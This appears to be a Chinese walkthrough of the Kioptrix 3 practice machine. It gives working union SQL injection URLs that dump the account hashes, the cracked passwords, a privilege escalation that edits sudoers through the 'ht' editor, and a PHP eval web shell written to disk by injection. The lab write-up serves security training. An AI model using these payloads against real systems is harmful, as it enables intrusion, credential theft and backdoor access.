# 信息搜集

1、扫主机存活

```bash
└─# nmap -sn 192.168.0.0/24 --min-rate=3333 -r
```

2、扫端口

```bash
└─# nmap -p- -sV -A 192.168.0.102
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30e3f6dc2e225d17ac460239ad71cb49 (DSA)
|_  2048 9a82e696e47ed6a6d74544cb19aaecdd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
MAC Address: 00:0C:29:00:E1:ED (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3、观察 80 端口

<img src=".\图片\Snipaste_2023-06-18_10-49-24.png" alt="Snipaste_2023-06-18_10-49-24" style="zoom:80%;" />

发现有链接跳到 `kioptrix3.com` ，于是再绑定 hosts 文件再访问

<img src=".\图片\Snipaste_2023-06-18_11-01-08.png" alt="Snipaste_2023-06-18_11-01-08" style="zoom:67%;" />



# WEB打点

## SQL注入

1、发现注入点，id 为注入点

```http
http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos
```

输入单引号显示报错

<img src=".\图片\Snipaste_2023-06-18_11-42-11.png" alt="Snipaste_2023-06-18_11-42-11" style="zoom:67%;" />

2、联合注入获取数据

判断当前表列名，有 6 个字段 

```http
http://kioptrix3.com/gallery/gallery.php?id=1 order by 6-- &sort=filename#photos
```

获取当前数据库，为 `gallery` ，且当前用户为 root，也可以尝试读写文件

```http
http://kioptrix3.com/gallery/gallery.php?id=-1 union select 1,database(),3,4,5,6-- &sort=filename#photos
```

获取表名，如下

```
dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users
```

```http
http://kioptrix3.com/gallery/gallery.php?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='gallery'),3,4,5,6-- &sort=filename#photos
```

获取 `dev_accounts` 表中 的字段名，为 id，username，password

```http
http://kioptrix3.com/gallery/gallery.php?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='dev_accounts'),3,4,5,6-- &sort=filename#photos
```

获取 `dev_accounts` 表中的数据，顾名思义为机器用户的表

```http
http://kioptrix3.com/gallery/gallery.php?id=-1 union select 1,(select group_concat(username,0x7e,password) from gallery.dev_accounts),3,4,5,6-- &sort=filename#photos
```

得到数据

```
dreg~0d3eccfb887aabd50f243b3f155c0f85,loneferret~5badcaf789d3d1d09794d8f021f40f0e
```

md5 破解得

```
dreg:Mast3r
loneferret:starwars
```

## SSH登录

由于目标机开启了 22 端口，我们可以 ssh 远程登录

```bash
└─# ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  loneferret@192.168.0.102                                                      255 ⨯
The authenticity of host '192.168.0.102 (192.168.0.102)' can't be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.102' (RSA) to the list of known hosts.
loneferret@192.168.0.102's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ id
uid=1000(loneferret) gid=100(users) groups=100(users)
```

# 提权

```bash
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
    
loneferret@Kioptrix3:~$find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/apache2/suexec
/usr/lib/pt_chown
/usr/bin/arping
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/local/bin/ht
/usr/sbin/pppd
/usr/sbin/uuidd
/lib/dhcp3-client/call-dhclient-script
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/bin/ping6
/bin/su
```

发现可以以 `root` 用户身份执行 `/usr/local/bin/ht`，这是一个编辑器，这里也可以尝试修改 /etc/passwd 里 root 的密码 ，与 vim 类似的方法吧

编辑 /etc/sudoers 文件

<img src=".\图片\Snipaste_2023-06-18_12-17-12.png" alt="Snipaste_2023-06-18_12-17-12" style="zoom:80%;" />

再 `sudo /bin/bash` 提权

```bash
loneferret@Kioptrix3:~$ sudo /usr/local/bin/ht
loneferret@Kioptrix3:~$ sudo /bin/bash
root@Kioptrix3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix3:~# cd /root
root@Kioptrix3:/root# ls
Congrats.txt  ht-2.0.18
```

# 补充

其实在 sql 注入里写文件也是可以的

```http
http://kioptrix3.com/gallery/gallery.php?id=-1 union select 1,"<?php @eval($_POST['cmd']); ?>",3,4,5,6 into outfile "/tmp/1.php"-- &sort=filename#photos
```

```bash
root@Kioptrix3:/tmp# ls
1.php
```
